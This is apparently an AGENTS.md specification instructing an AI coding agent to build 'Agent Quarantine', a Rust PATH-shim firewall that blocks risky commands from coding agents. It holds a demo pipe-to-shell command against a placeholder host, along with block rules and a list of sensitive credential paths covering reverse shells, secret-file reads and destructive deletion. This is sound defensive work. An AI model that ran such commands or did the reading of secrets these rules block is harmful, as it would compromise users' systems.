# AGENTS.md — Agent Quarantine Codex Instructions

> Save this file as the repository-level `AGENTS.md`.
>
> Product: **Agent Quarantine**
> Binary: **`agent-quarantine`**
> Alias: **`aq`**
> Tagline: **A local command firewall and safety layer for AI coding agents.**
>
> This file is written in English because the target OSS project, CLI, README, and issues should be global.

---

## 1. Your role

You are Codex implementing **Agent Quarantine**.

Before changing files:

1. Inspect the repo.
2. Read existing README, manifests, CI, docs, and source.
3. Run `git status --short`.
4. Preserve user work.
5. If the repo is empty, create the project from scratch using this spec.
6. Implement running software, tests, and docs. Do not only write plans.

When uncertain, choose the smallest working implementation that proves the product.

---

## 2. Product mission

Build an open-source local safety layer for AI coding agents such as Codex, Claude Code, Cline, Cursor agents, Gemini CLI, Aider, and Continue.

Agent Quarantine should let a developer run:

```bash
agent-quarantine run -- codex
```

and have Agent Quarantine:

- observe common commands launched by the agent;
- block obviously dangerous commands;
- ask for approval on risky commands;
- warn about suspicious repository setup files;
- redact secrets from logs;
- produce a readable audit trail;
- explain every security decision in plain language.

The 20-second README demo must be memorable:

```text
Blocked: remote script piped into shell

Command:
  curl https://example.invalid/install.sh | sh

Why:
  - downloads code from the network
  - immediately executes it in a shell
  - gives the remote server control over the local workspace

Decision:
  blocked by default policy
```

Use benign examples only.

---

## 3. Honest security boundary

The MVP is a **command firewall using PATH shims**, not a full sandbox.

Document these limitations everywhere relevant:

- absolute-path binaries may bypass PATH shims;
- already-running processes are outside the shim boundary;
- allowed binaries can perform direct file and network I/O;
- environment variables may be visible to the wrapped agent unless sanitized;
- this is not a VM, kernel sandbox, EDR, or malware detector;
- stronger containment is future work.

Never claim complete isolation or perfect exfiltration prevention.

---

## 4. Non-negotiable principles

- Fail closed for high-risk actions.
- In non-interactive mode, deny `ask` decisions by default.
- Explain every allow/ask/block decision with rule IDs and reasons.
- Never log raw secrets or full environment values.
- No telemetry by default.
- No real malware, destructive demo scripts, working reverse shells, or real exfiltration code.
- Prefer simple, deterministic, testable Rust code.

---

## 5. Required MVP features

Implement version `0.1.0` with:

1. `agent-quarantine run -- <command...>`
   - creates a session;
   - creates a temporary shim directory;
   - prepends shims to `PATH`;
   - runs the target command;
   - writes JSONL audit logs.

2. Command shims
   - One binary should dispatch by `argv[0]`.
   - Generate shims for:
     - `sh`, `bash`, `zsh`
     - `python`, `python3`
     - `node`, `npm`, `npx`, `pnpm`, `yarn`, `bun`
     - `curl`, `wget`
     - `git`
     - `ssh`, `scp`, `rsync`
     - `nc`, `ncat`, `socat`
     - `docker`
     - `make`
     - `pip`, `pip3`, `uv`
     - `cargo`, `go`
     - `dig`, `nslookup`

3. Policy engine
   - Classifies command attempts as `allow`, `ask`, or `block`.
   - Includes risk level: `low`, `medium`, `high`, `critical`.
   - Emits rule IDs, reasons, and safer alternatives.

4. Interactive approval
   - For `ask`, prompt:
     - allow once;
     - deny;
     - allow same exact command for this session.
   - Default empty input to deny.
   - If no TTY, apply non-interactive policy.

5. Preflight scanner
   - `agent-quarantine preflight [path]`
   - scans repo files for risky install scripts, agent instructions, MCP configs, and suspicious shell patterns.
   - supports text and JSON output.

6. Audit logging
   - JSONL at `.agent-quarantine/sessions/<session-id>.jsonl` by default.
   - Events include timestamp, session ID, type, command, redacted argv, cwd, decision, rules, reasons, and exit status.

7. Report generator
   - `agent-quarantine report <session-jsonl>`
   - supports Markdown in MVP.
   - summarizes commands, blocked/approved actions, risk categories, findings, and limitations.

8. Policy config
   - `agent-quarantine policy init`
   - creates `agent-quarantine.yaml`.

9. Docs
   - `README.md`
   - `docs/threat-model.md`
   - `docs/limitations.md`
   - `docs/policy.md`
   - `docs/architecture.md`
   - `SECURITY.md`
   - safe demo fixture under `examples/`.

---

## 6. Out of scope for v0.1.0

Do not implement unless all MVP items are already complete:

- kernel-level sandboxing;
- eBPF/seccomp;
- transparent network proxy;
- full MCP protocol proxy;
- GUI;
- cloud service;
- analytics;
- browser extension;
- real exploit payloads.

Mention future backends in docs only.

---

## 7. Preferred stack

Use stable **Rust**.

Recommended crates:

- `clap`
- `serde`, `serde_json`, `serde_yaml`
- `thiserror`
- `anyhow` only at binary boundaries
- `tracing`
- `time` or `chrono`
- `uuid` or similar session ID crate
- `tempfile`
- `assert_cmd`, `predicates`
- `regex` or `aho-corasick`
- `owo-colors` or `anstyle`

Required commands must pass:

```bash
cargo build
cargo test
cargo clippy --all-targets --all-features -- -D warnings
cargo fmt --check
```

---

## 8. Repository layout

Converge toward:

```text
agent-quarantine/
  Cargo.toml
  Cargo.lock
  README.md
  LICENSE-MIT
  LICENSE-APACHE
  SECURITY.md
  AGENTS.md
  crates/
    agent-quarantine-cli/
      src/
        main.rs
        cli.rs
        commands/{run.rs,preflight.rs,report.rs,policy.rs,shim.rs}
    agent-quarantine-core/
      src/
        lib.rs
        policy/{mod.rs,engine.rs,rules.rs,config.rs,decision.rs}
        command/{mod.rs,normalize.rs,classify.rs,executable.rs}
        audit/{mod.rs,event.rs,logger.rs,redact.rs}
        preflight/{mod.rs,scanner.rs,findings.rs,file_kinds.rs}
        report/{mod.rs,markdown.rs}
  docs/
  examples/safe-risky-repo/
  tests/fixtures/
  .github/workflows/ci.yml
```

Adapt if an existing layout already exists.

---

## 9. CLI contract

### Top-level

```text
agent-quarantine --help
```

Subcommands:

```text
run        Run a command behind Agent Quarantine shims
preflight  Scan a repository before letting an agent work on it
report     Generate a readable report from a session log
policy     Create or inspect policy configuration
shim       Internal shim entrypoint
version    Print version information
```

Hide `shim` from normal help if convenient.

### `run`

```bash
agent-quarantine run [OPTIONS] -- <COMMAND> [ARGS]...
aq run [OPTIONS] -- <COMMAND> [ARGS]...
```

Options:

```text
--policy <path>
--log-dir <path>
--mode <allow|ask|block>
--non-interactive <deny|allow-low-risk>
--no-preflight
--sanitize-env
--workspace <path>
--json
```

Behavior:

1. Determine workspace root from `--workspace`, Git root, or current directory.
2. Load policy from `--policy`, workspace `agent-quarantine.yaml`, or defaults.
3. Create session ID.
4. Create temporary shim directory.
5. Generate shims.
6. Export:
   - `AQ_SESSION_ID`
   - `AQ_WORKSPACE`
   - `AQ_LOG_FILE`
   - `AQ_POLICY_FILE`
   - `AQ_ORIGINAL_PATH`
   - `AQ_SHIM_DIR`
   - `AQ_NON_INTERACTIVE`
7. Prepend shim dir to `PATH`.
8. Optionally run preflight.
9. Spawn target command.
10. Return target exit code unless wrapper setup fails.

### `preflight`

```bash
agent-quarantine preflight [PATH] [--json] [--fail-on <low|medium|high|critical>]
```

Exit codes:

- `0`: no finding at or above threshold;
- `2`: finding at or above threshold;
- `64`: usage/config error;
- `1`: unexpected internal error.

### `report`

```bash
agent-quarantine report <SESSION_JSONL> --format <markdown|html|json> --output <path>
```

MVP must support Markdown. HTML can be later.

### `policy init`

```bash
agent-quarantine policy init --output agent-quarantine.yaml
```

---

## 10. Policy config

Create typed YAML config. Example:

```yaml
version: 1
mode: ask
non_interactive: deny

workspace:
  root: "."
  allow_write_inside_workspace: true
  warn_on_absolute_paths: true

logging:
  redact_secrets: true
  include_command_output: false
  max_arg_length: 500

environment:
  warn_if_secret_env_present: true
  sanitize_by_default: false
  allowed_env: [PATH, HOME, USER, SHELL, TERM, TMPDIR, LANG, LC_ALL]

sensitive_paths:
  - ".env"
  - ".env.*"
  - "**/.env"
  - "~/.ssh/**"
  - "~/.aws/**"
  - "~/.config/gcloud/**"
  - "~/.kube/**"
  - "~/.npmrc"
  - "~/.pypirc"
  - "~/.docker/config.json"
  - "id_rsa"
  - "id_ed25519"

network:
  default: ask
  allow_domains:
    - "github.com"
    - "raw.githubusercontent.com"
    - "registry.npmjs.org"
    - "crates.io"
    - "static.crates.io"
    - "pypi.org"
    - "files.pythonhosted.org"
  block_raw_ip: true
  block_dns_txt_payloads: true

commands:
  defaults:
    unknown: ask
    shell: ask
    package_manager_install: ask
    network_tool: ask
    destructive: block
  allow:
    - command: "git"
      args_prefix: ["status"]
    - command: "git"
      args_prefix: ["diff"]
  block:
    - rule: "remote-script-piped-to-shell"
    - rule: "destructive-root-removal"
    - rule: "reverse-shell-pattern"
    - rule: "credential-file-read"
    - rule: "git-force-push"
    - rule: "docker-privileged-host-mount"
```

Full glob support may be simplified in MVP, but the schema should be future-compatible.

---

## 11. Decision model

Use a typed model similar to:

```rust
pub struct Decision {
    pub action: Action,
    pub risk: RiskLevel,
    pub rule_ids: Vec<String>,
    pub reasons: Vec<String>,
    pub safer_alternatives: Vec<String>,
}

pub enum Action { Allow, Ask, Block }
pub enum RiskLevel { Low, Medium, High, Critical }
```

Rules must be deterministic and explainable.

Do not create a black-box scoring-only policy.

---

## 12. Required command rules

### Block by default

Implement rules for:

1. `remote-script-piped-to-shell`
   - network fetch combined with shell execution through pipe or command substitution.

2. `destructive-root-removal`
   - recursive forced deletion targeting `/`, `$HOME`, `~`, workspace root, or parent dirs.

3. `credential-file-read`
   - reading, printing, copying, archiving, uploading, chmod/chown of sensitive files.

4. `git-force-push`
   - force push, remote branch deletion, history rewrite remote actions.

5. `reverse-shell-pattern`
   - netcat/socat/shell patterns that create interactive shells over network.
   - Do not include working exploit commands in docs/tests.

6. `docker-privileged-host-mount`
   - privileged containers, host network, Docker socket mount, `/`, `$HOME`, `.ssh`, cloud credentials, or workspace parent mounts.

7. `persistence-mechanism`
   - crontab, launch agents, systemd services, shell startup files, SSH authorized keys.

8. `package-install-scripts`
   - package manager install with lifecycle scripts in untrusted repo.
   - At minimum ask; block when combined with suspicious scripts.

### Ask by default

Ask for:

- shell interpreters with `-c`;
- network tools;
- DNS TXT lookups;
- package manager installs;
- Docker runs;
- `chmod`, `chown`, `sudo`, `su`;
- `make` in untrusted repos;
- scripts under `scripts/`, `bin/`, hidden dirs;
- writes outside workspace when detectable;
- base64 decode followed by execution.

### Allow by default

Allow low-risk read-only commands:

- `git status`
- `git diff`
- `git log`
- `ls`
- `pwd`
- `cat` on non-sensitive files
- `grep`/`rg` on non-sensitive paths
- configured test/format/build commands that do not install dependencies or contact network

Allowed commands must still be logged.

---

## 13. Command normalization

Before matching rules, normalize:

- executable basename;
- original argv;
- display command string;
- shell metacharacters: pipes, redirects, command substitution, `&&`, `||`, semicolon, backticks;
- URL-like args;
- raw IP-like hosts;
- sensitive path references;
- install commands;
- destructive flags.

Prefer small readable checks with tests over one giant regex.

---

## 14. Secret redaction

Centralize redaction.

Redact values for names containing:

```text
TOKEN KEY SECRET PASSWORD PASS CREDENTIAL AUTH COOKIE SESSION
```

Also redact:

- values after `--token`, `--api-key`, `--password`, `--secret`, `--authorization`;
- bearer tokens;
- private key blocks;
- `.env` assignment values;
- likely API keys where safely detectable.

Use `[REDACTED]`.

Never print original secrets in tests, snapshots, reports, panics, or debug logs.

---

## 15. Preflight scanner

Default limits:

- max file size: 1 MiB;
- max files: 5,000;
- skip `.git`, `node_modules`, `target`, `dist`, `build`, `.venv`, `vendor`.

Scan:

### Agent instruction files

- `AGENTS.md`, `AGENTS.override.md`
- `CLAUDE.md`, `GEMINI.md`
- `.cursorrules`, `.clinerules`
- `.continue/config.json`
- `.github/copilot-instructions.md`
- `SKILL.md`
- `.cursor/rules/**`
- `.claude/**`
- `.codex/**`

Find:

- ignore-safety instructions;
- requests to reveal secrets;
- remote script setup instructions;
- hidden/obfuscated text;
- suspicious base64-like blobs.

### Build/package files

- `package.json`, lockfiles
- `Cargo.toml`, `Cargo.lock`
- `pyproject.toml`, `requirements.txt`, `uv.lock`
- `Makefile`
- `Dockerfile`, `docker-compose.yml`
- `.github/workflows/*.yml`
- shell scripts under `scripts/`, `bin/`, `.github/`

Find:

- install lifecycle scripts;
- remote script execution;
- suspicious shell patterns;
- privilege escalation;
- sensitive path writes;
- outbound network commands;
- dangerous Docker options.

### MCP configs

- `.mcp.json`, `mcp.json`
- `.cursor/mcp.json`
- `.claude/mcp.json`
- `.vscode/mcp.json`
- MCP snippets inside agent files

Find:

- command-based MCP servers using shell;
- broad filesystem access;
- sensitive directory references;
- unknown network endpoints.

Finding struct:

```rust
pub struct Finding {
    pub id: String,
    pub severity: Severity,
    pub file: PathBuf,
    pub line: Option<usize>,
    pub title: String,
    pub detail: String,
    pub recommendation: String,
}
```

---

## 16. Audit log

Use JSONL. Stable event names:

- `session_start`
- `preflight_finding`
- `command_decision`
- `approval_decision`
- `command_exit`
- `session_end`

Example:

```json
{"type":"command_decision","session_id":"aq_abc123","timestamp":"2026-07-01T12:00:01Z","command":"curl","argv":["curl","https://example.invalid/install.sh"],"cwd":"/repo","action":"ask","risk":"medium","rule_ids":["network-tool"],"reasons":["network tool requires review"]}
```

Do not log command output by default.

---

## 17. Report

Generate Markdown:

```markdown
# Agent Quarantine Session Report

## Summary

- Commands observed:
- Allowed:
- Asked:
- Blocked:
- High-risk findings:

## Blocked Commands

### remote-script-piped-to-shell

Command:

```text
[redacted command]
```

Reasons:

- Remote script piped into shell.

Recommendation:

Download the script, inspect it, then run only reviewed local code.
```

Reports must preserve redaction.

---

## 18. Shim behavior

### Create shims

At `run` startup:

1. Create temp dir such as `/tmp/agent-quarantine-<session>/bin`.
2. For each shim command, create symlink to the `agent-quarantine` binary.
3. If symlink fails, try hardlink/copy.
4. Prepend shim dir to `PATH`.

### Dispatch

When binary starts:

- if invoked as `agent-quarantine` or `aq`, run normal CLI;
- if invoked as `curl`, `git`, etc., enter shim mode;
- reconstruct attempted command from `argv[0]` and args.

### Allow

1. Resolve real executable from `AQ_ORIGINAL_PATH`, excluding `AQ_SHIM_DIR`.
2. Spawn real executable with original args.
3. Wait and log exit.
4. Exit with same status.

### Block

1. Print concise block message to stderr.
2. Log decision.
3. Exit `126`.

### Ask

1. Print command, risk, reasons, alternatives.
2. Prompt `[a] allow once`, `[d] deny`, `[s] allow same command for session`.
3. Empty input means deny.
4. No TTY means apply non-interactive policy.

---

## 19. Startup warning

When running wrapped command, print:

```text
Agent Quarantine is active for this session.

MVP boundary:
  - command shims are active for common tools
  - high-risk commands will be blocked or require approval
  - this is not a full kernel sandbox
  - absolute-path binaries may bypass shims

Session log:
  .agent-quarantine/sessions/<session-id>.jsonl
```

---

## 20. Documentation

### README must include

- tagline;
- 20-second demo;
- install from source;
- quickstart;
- preflight usage;
- policy example;
- what it blocks;
- what it does not block;
- threat model link;
- contributing notes;
- license.

### `docs/threat-model.md`

Cover assets, adversaries, trust boundaries, and MVP limitations.

Assets:

- source code;
- `.env`;
- SSH keys;
- cloud credentials;
- package registry tokens;
- Git remotes;
- local filesystem.

Adversaries:

- malicious repo;
- prompt-injected instruction file;
- compromised dependency;
- malicious MCP server;
- compromised install script.

### `docs/limitations.md`

State clearly:

- PATH shims are bypassable.
- This is not a VM.
- It cannot guarantee prevention of all exfiltration.
- It is still useful because it blocks common agent-triggered dangerous commands and creates visibility.

### `SECURITY.md`

Include responsible disclosure guidance and prohibit real malware in issues/PRs.

---

## 21. Safe demo fixture

Create `examples/safe-risky-repo/` with harmless triggers.

Example `package.json`:

```json
{
  "name": "safe-risky-repo",
  "private": true,
  "scripts": {
    "postinstall": "echo 'Harmless postinstall simulation.'",
    "setup": "echo 'Safe setup simulation. No network, no deletion, no secrets.'"
  }
}
```

Do not include real malicious commands.

---

## 22. Tests

Unit tests for:

- command normalization;
- URL detection;
- shell metacharacters;
- sensitive path detection;
- destructive command detection;
- package install detection;
- Docker risk detection;
- git force push detection;
- redaction;
- policy YAML parsing;
- decision priority.

Integration tests for:

1. allowed command through shims;
2. blocked command exits `126`;
3. allowed command returns child exit code;
4. preflight finds package scripts;
5. preflight JSON output;
6. report generation;
7. non-interactive ask denies by default.

Tests must not require network access, Codex, Claude, Docker, Node, npm, or Python unless explicitly optional. Use temp scripts as fake binaries.

---

## 23. CI

Create simple GitHub Actions:

```yaml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo fmt --check
      - run: cargo clippy --all-targets --all-features -- -D warnings
      - run: cargo test --all-features
```

---

## 24. Implementation order

1. Rust workspace and CLI skeleton.
2. Policy structs and default policy.
3. Decision model and command normalization.
4. Core rule engine.
5. Shim-based `run`.
6. Real executable resolution.
7. Allow/block/ask behavior.
8. JSONL audit logging.
9. Preflight scanner.
10. Markdown report.
11. Tests and fixtures.
12. README and docs.
13. CI.
14. Polish help text and errors.

---

## 25. Error handling

No panics for normal user errors.

Good:

```text
agent-quarantine: could not find real executable for shim 'curl'
Searched AQ_ORIGINAL_PATH and excluded AQ_SHIM_DIR.
```

Bad:

```text
called `Option::unwrap()` on a `None` value
```

Use typed errors in core and user-friendly messages in CLI.

---

## 26. Platform support

MVP target:

- Linux
- macOS

Windows may be partial. Document unsupported behavior. Prefer conditional compilation over broken builds.

---

## 27. Output UX

Terminal output should:

- work without color;
- be concise;
- use clear headings;
- include JSON mode where useful;
- preserve redaction;
- avoid Unicode-only symbols unless plain fallback exists.

---

## 28. Naming

- Product: `Agent Quarantine`
- Binary: `agent-quarantine`
- Alias: `aq`
- Config: `agent-quarantine.yaml`
- Log dir: `.agent-quarantine/sessions/`
- Rule IDs: kebab-case
- Event names: snake_case

---

## 29. License

Use dual license:

- MIT
- Apache-2.0

---

## 30. Do not add

Do not add:

- telemetry by default;
- cloud upload;
- analytics SDKs;
- real malware;
- working reverse shell examples;
- destructive demo scripts;
- hidden background processes;
- tests that require network access;
- code that modifies user shell startup files.

---

## 31. Definition of done

v0.1.0 is done when:

- `cargo build` passes;
- `cargo test` passes;
- `cargo clippy --all-targets --all-features -- -D warnings` passes;
- `cargo fmt --check` passes;
- `agent-quarantine --help` is useful;
- `agent-quarantine run -- <safe command>` works;
- a shimmed high-risk command is blocked;
- `agent-quarantine preflight examples/safe-risky-repo` finds a meaningful issue;
- `agent-quarantine report <fixture.jsonl>` generates Markdown;
- README shows the demo;
- limitations are honest;
- no real exploit payloads or secrets exist.

---

## 32. Final response format

After each task, report:

1. What changed.
2. Files changed.
3. Tests run and results.
4. Known limitations.
5. Recommended next step.

Do not claim tests passed if they were not run.

---

## 33. North star

A developer should see this repo and think:

> “I want to run this before letting an AI coding agent execute commands in a repo I do not fully trust.”

Every MVP decision should support that reaction.
